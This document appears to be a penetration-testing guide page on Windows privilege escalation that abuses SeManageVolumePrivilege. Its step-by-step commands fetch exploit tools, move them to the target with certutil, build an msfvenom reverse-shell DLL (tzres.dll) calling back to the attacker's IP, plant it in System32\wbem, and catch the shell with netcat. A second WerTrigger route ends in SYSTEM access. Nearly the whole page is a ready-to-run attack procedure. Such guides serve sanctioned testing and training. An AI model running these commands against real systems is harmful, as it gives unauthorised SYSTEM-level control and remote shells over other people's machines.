---
legal-banner: true
---

### **Step 1: Check current user privileges**

1.  Verify if the current user has `SeManageVolumePrivilege`:  
    `whoami /priv`  
    
    ![](../../../img/Windows-Environment/153.png)

    **Note:** If it is not enabled, proceed to Step 2.

### **Step 2: Enable SeManageVolumePrivilege (optional)**

1.  Download the `EnableAllTokenPrivs.ps1` script:  
    `wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`  
    
    ![](../../../img/Windows-Environment/154.png)

    **Note:** Host the script with Python: `python -m http.server 80`
    
2.  Transfer the script to the target machine:  
    `certutil -urlcache -f http://[IP-ADDRESS]:80/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1`  
    
    ![](../../../img/Windows-Environment/155.png)

3.  Import the module to enable the privilege:  
    `Import-Module .\EnableAllTokenPrivs.ps1`
    
4.  Verify privileges again to confirm that `SeManageVolumePrivilege` is enabled:  
    `whoami /priv`  
    
    ![](../../../img/Windows-Environment/156.png)

### **DLL hijacking with Metasploit**

1.  Download and transfer `SeManageVolumeExploit.exe` to the target:  
    `wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe`  
    
    ![](../../../img/Windows-Environment/157.png)

    **Note:** Host the file with Python: `python -m http.server 80`
    
2.  Transfer it using `certutil`:  
    `certutil -urlcache -f http://[IP-ADDRESS]:80/SeManageVolumeExploit.exe SeManageVolumeExploit.exe`  
    
    ![](../../../img/Windows-Environment/158.png)
    
3.  Execute the exploit to gain write privileges to `C:\Windows\System32\`:  
    
    ![](../../../img/Windows-Environment/159.png)

4.  Create a malicious DLL payload with `msfvenom`:  
    `msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ADDRESS] LPORT=1337 -f dll -o tzres.dll`  
    
    ![](../../../img/Windows-Environment/160.png)

    **Note:** Host with Python and transfer with `certutil`:  
    `certutil -urlcache -f http://[IP-ADDRESS]:80/tzres.dll tzres.dll`  
    
    ![](../../../img/Windows-Environment/161.png)

5.  Place the malicious DLL in the WBEM directory:  
    `copy tzres.dll C:\Windows\System32\wbem\`
    
6.  Set up a Netcat listener on the attacking machine:  
    `rlwrap -cAr nc -lnvp 1337`  
    
    ![](../../../img/Windows-Environment/162.png)

    **Note:** Running `systeminfo` will trigger the payload.

### **Exploit with WerTrigger**

1.  Download and transfer `SeManageVolumeExploit.exe` to the target:  
    `wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe`  
    
    ![](../../../img/Windows-Environment/163.png)

    **Note:** Host the file with Python: `python -m http.server 80`
    
2.  Execute the exploit to gain write privileges to `C:\Windows\System32\`:  
    
    ![](../../../img/Windows-Environment/164.png)

3.  Download required files:  
    ```
    wget https://github.com/sailay1996/WerTrigger/raw/master/bin/WerTrigger.exe
    wget https://github.com/sailay1996/WerTrigger/raw/master/bin/phoneinfo.dll
    wget https://raw.githubusercontent.com/sailay1996/WerTrigger/master/bin/Report.wer
    cp /usr/share/windows-resources/binaries/nc.exe .
    ```  
    
    ![](../../../img/Windows-Environment/165.png)

    **Note:** Host them with Python: `python -m http.server 80`
    
4.  Transfer files to the target using `certutil`:  
    ```
    certutil -urlcache -f http://[IP-ADDRESS]:80/WerTrigger.exe WerTrigger.exe
    certutil -urlcache -f http://[IP-ADDRESS]:80/phoneinfo.dll phoneinfo.dll
    certutil -urlcache -f http://[IP-ADDRESS]:80/nc.exe nc.exe
    certutil -urlcache -f http://[IP-ADDRESS]:80/Report.wer Report.wer
    ```  
    
    ![](../../../img/Windows-Environment/166.png)

5.  Copy `phoneinfo.dll` to `C:\Windows\System32\`, place `Report.wer` and `WerTrigger.exe` in the same directory, then run `WerTrigger.exe`:  
    
    ![](../../../img/Windows-Environment/167.png)

    **Note:** `WerTrigger.exe` produces no output; it waits for instructions.

6.  At this point, you should have SYSTEM-level access on the target machine.  
    
    ![](../../../img/Windows-Environment/168.png)